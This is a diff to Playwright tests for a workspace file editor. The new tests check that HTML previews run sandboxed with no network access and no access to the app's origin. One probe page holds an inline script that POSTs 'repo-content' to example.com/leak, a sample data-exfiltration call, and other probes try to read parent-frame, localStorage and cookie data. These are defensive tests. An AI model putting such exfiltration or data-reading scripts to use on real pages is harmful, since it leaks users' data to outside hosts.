@@ -160,7 +160,7 @@ test.describe("CodeMirror workspace file editing", () => {
       relativePath,
     );
     await expect(page.getByTestId("file-panel-bar")).not.toContainText("visuals.md");
-    const modeControl = page.getByTestId("file-markdown-mode");
+    const modeControl = page.getByTestId("file-preview-mode");
     await expect(modeControl).toBeVisible();
     await page.getByTestId("file-mode-source").click();
 
@@ -374,7 +374,7 @@ test.describe("CodeMirror workspace file editing", () => {
     await openWorkspaceFile(page, "notes.md");
 
     await expect(page.getByText("First heading", { exact: true })).toBeVisible();
-    await expect(page.getByTestId("file-markdown-mode")).toBeVisible();
+    await expect(page.getByTestId("file-preview-mode")).toBeVisible();
     await writeFile(markdownPath, "# Updated heading\n", "utf8");
     await expect(page.getByText("Updated heading", { exact: true })).toBeVisible();
 
@@ -391,6 +391,125 @@ test.describe("CodeMirror workspace file editing", () => {
     const initialSource = await image.getAttribute("src");
     await writeFile(imagePath, BLUE_PIXEL);
     await expect.poll(() => image.getAttribute("src")).not.toBe(initialSource);
+  });
+
+  test("renders HTML plans in Preview and keeps the sandboxed frame off the app origin", async ({
+    page,
+    withWorkspace,
+  }) => {
+    test.setTimeout(90_000);
+    const workspace = await withWorkspace({ prefix: "file-editing-html-preview-" });
+    const htmlPath = path.join(workspace.repoPath, "plan.html");
+    await writeFile(
+      htmlPath,
+      "<!doctype html><html><body><h1>Visual plan</h1></body></html>",
+      "utf8",
+    );
+    await workspace.navigateTo();
+    await openWorkspaceFile(page, "plan.html");
+
+    const frameHost = page.getByTestId("file-html-preview");
+    await expect(frameHost).toBeVisible();
+    await expect(frameHost).toHaveAttribute("sandbox", /allow-scripts/);
+    await expect(frameHost).not.toHaveAttribute("sandbox", /allow-same-origin/);
+    await expect(
+      page.frameLocator('[data-testid="file-html-preview"]').getByRole("heading", {
+        name: "Visual plan",
+      }),
+    ).toBeVisible();
+
+    await writeFile(
+      htmlPath,
+      "<!doctype html><html><body><h1>Updated plan</h1></body></html>",
+      "utf8",
+    );
+    await expect(
+      page.frameLocator('[data-testid="file-html-preview"]').getByRole("heading", {
+        name: "Updated plan",
+      }),
+    ).toBeVisible();
+
+    await page.getByTestId("file-mode-source").click();
+    await expect(page.getByTestId("file-source-editor")).toBeVisible();
+    await expect(frameHost).toHaveCount(0);
+    await page.getByTestId("file-mode-preview").click();
+    await expect(frameHost).toBeVisible();
+  });
+
+  test("runs a plan page's own scripts but refuses network egress from the preview", async ({
+    page,
+    withWorkspace,
+  }) => {
+    test.setTimeout(90_000);
+    const workspace = await withWorkspace({ prefix: "file-editing-html-csp-" });
+    // The page reports what the preview let it do: inline script must run, and
+    // every attempt to reach the network must be refused.
+    await writeFile(
+      path.join(workspace.repoPath, "probe.html"),
+      `<!doctype html><html><head><title>probe</title></head><body>
+<h1 id="out">inline-script-did-not-run</h1>
+<p id="net">no-fetch-attempted</p>
+<script>
+  document.getElementById("out").textContent = "inline-script-ran";
+  var net = document.getElementById("net");
+  fetch("https://example.com/leak", { method: "POST", body: "repo-content" })
+    .then(function () { net.textContent = "fetch-allowed"; })
+    .catch(function () { net.textContent = "fetch-blocked"; });
+</script>
+</body></html>`,
+      "utf8",
+    );
+    await workspace.navigateTo();
+
+    const blockedRequests: string[] = [];
+    page.on("request", (request) => {
+      if (request.url().startsWith("https://example.com/")) blockedRequests.push(request.url());
+    });
+
+    await openWorkspaceFile(page, "probe.html");
+
+    const frame = page.frameLocator('[data-testid="file-html-preview"]');
+    // Inline script ran, so the preview is not simply inert.
+    await expect(frame.locator("#out")).toHaveText("inline-script-ran");
+    // ...and the same script could not reach the network.
+    await expect(frame.locator("#net")).toHaveText("fetch-blocked");
+    expect(blockedRequests).toEqual([]);
+  });
+
+  test("keeps the HTML preview off the app origin and out of app storage", async ({
+    page,
+    withWorkspace,
+  }) => {
+    test.setTimeout(90_000);
+    const workspace = await withWorkspace({ prefix: "file-editing-html-origin-" });
+    // Each probe reports what the sandbox refused. An opaque origin makes every
+    // one of these throw, which is the boundary that bounds the documented
+    // self-navigation gap in SECURITY.md to the page's own contents.
+    await writeFile(
+      path.join(workspace.repoPath, "origin.html"),
+      `<!doctype html><html><body>
+<p id="parent">?</p><p id="storage">?</p><p id="cookie">?</p>
+<script>
+  function probe(id, fn) {
+    try { document.getElementById(id).textContent = fn(); }
+    catch (e) { document.getElementById(id).textContent = "blocked"; }
+  }
+  probe("parent", function () { return parent.document.body ? "reachable" : "blocked"; });
+  probe("storage", function () { return localStorage.length >= 0 ? "reachable" : "blocked"; });
+  // An opaque origin has no cookie store at all, so this throws rather than
+  // returning an empty string.
+  probe("cookie", function () { return document.cookie.length >= 0 ? "readable" : "readable"; });
+</script>
+</body></html>`,
+      "utf8",
+    );
+    await workspace.navigateTo();
+    await openWorkspaceFile(page, "origin.html");
+
+    const frame = page.frameLocator('[data-testid="file-html-preview"]');
+    await expect(frame.locator("#parent")).toHaveText("blocked");
+    await expect(frame.locator("#storage")).toHaveText("blocked");
+    await expect(frame.locator("#cookie")).toHaveText("blocked");
   });
 
   test("persists Vim keybindings and reports Vim mode with cursor position", async ({
